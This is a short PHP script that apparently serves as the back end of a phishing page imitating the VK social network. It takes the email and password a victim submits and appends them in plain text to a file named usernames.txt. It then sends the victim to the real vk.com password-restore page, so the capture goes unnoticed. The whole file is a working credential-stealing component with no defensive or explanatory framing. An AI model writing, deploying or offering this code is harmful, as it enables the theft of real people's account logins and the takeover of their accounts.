<?php

file_put_contents("usernames.txt", "Vk Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://vk.com/restore/');
exit();
